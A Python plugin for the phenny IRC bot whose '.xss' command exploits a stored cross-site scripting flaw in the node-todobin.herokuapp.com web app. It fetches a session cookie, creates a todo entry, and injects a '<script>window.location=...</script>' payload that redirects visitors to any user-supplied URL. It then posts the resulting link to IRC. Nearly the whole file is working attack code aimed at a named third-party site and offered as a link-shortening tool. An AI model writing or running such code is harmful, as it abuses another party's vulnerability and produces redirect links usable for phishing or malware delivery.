#!/usr/bin/python3
"""
node-todo.py - node-todo uploader
author: mutantmonkey <mutantmonkey@mutantmonkey.in>
author: telnoratti <calvin@winkowski.me>
"""

from urllib.error import HTTPError
from urllib import request
import web
import json

def xss(phenny, input):
    """.xss <url> - Upload a URL to an XSS vulnerability in node-todobin.herokuapp.com."""

    url = input.group(2)
    if not url:
        phenny.reply("No URL provided.")
        return

    if not url.startswith('http'):
        url = ''.join(['http://', url])

    try:
        url = urlshortener(url)
    except (HTTPError, IOError):
        phenny.reply("THE INTERNET IS FUCKING BROKEN. Please try again later.")
        return
    
    phenny.reply(url)
xss.rule = (['xss'], r'(.*)')



def urlshortener(longurl):
    xss = ''.join(["""{"status":false,"text":"<script>window.location='""", longurl, """'</script>"}"""])
    xss = xss.encode()
    r = request.urlopen('http://node-todobin.herokuapp.com/list')
    cookie = r.info().get('Set-Cookie').partition('=')[2].partition(';')[0]

    r = request.Request('http://node-todobin.herokuapp.com/api/todos', 
        headers={
            'Content-Type': 'application/json',
            'Accept': 'application/json, text/javascript, */*',
            'Cookie': cookie,
        }, data=b'{"id":null}')
    opener = request.build_opener(request.HTTPHandler)
    response = opener.open(r)
    data = response.read()
    js = json.loads(data.decode('utf-8'))
    uri = js.get('uri')
    url = '/'.join(['http://node-todobin.herokuapp.com/api/todos', uri])
    newurl = '/'.join(['http://node-todobin.herokuapp.com/list', uri])

    request.urlopen(url)
    request.urlopen(newurl)
    r = request.Request(url, 
        headers={
            'Content-Type': 'application/json',
            'Accept': 'application/json, text/javascript, */*',
            'Cookie': cookie,
        }, data=xss)
    
    opener.open(r)

    return newurl

if __name__ == '__main__':
    print(__doc__.strip())
